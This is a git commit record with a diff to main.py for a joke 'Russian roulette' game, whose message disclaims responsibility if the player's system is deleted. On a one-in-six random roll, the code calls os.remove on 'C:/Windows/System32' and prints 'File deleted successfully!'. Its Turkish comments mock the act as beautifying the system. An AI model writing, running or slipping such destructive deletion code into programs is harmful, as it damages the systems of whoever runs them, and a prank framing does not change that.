454e4642741db27623318b1a44feb70f68a4c037
Süleyman Cem Kalach <sirkalach@usa.com>
2022-12-20 18:50:22 +0100

    Update main.py
    NOTE: I do not accept any responsibility if you play the game and your system is deleted!

--- main.py
+++ main.py
@@ -1,5 +1,12 @@
-from random import randint
+import random
 import os
 
-if random.randint(1,6) == 1: #Uzatmanın manası yoktur.
-    os.remove('C:/Windows/System32') #Sistemi güzelleştirir.
+# Generate a random number between 1 and 6
+result = random.randint(1, 6)
+
+#If the result is 1, simulate "losing" the game and delete the system file
+if result == 1:
+  os.remove('C:/Windows/System32')
+  print("File deleted successfully!")
+else:
+  print("You win!")
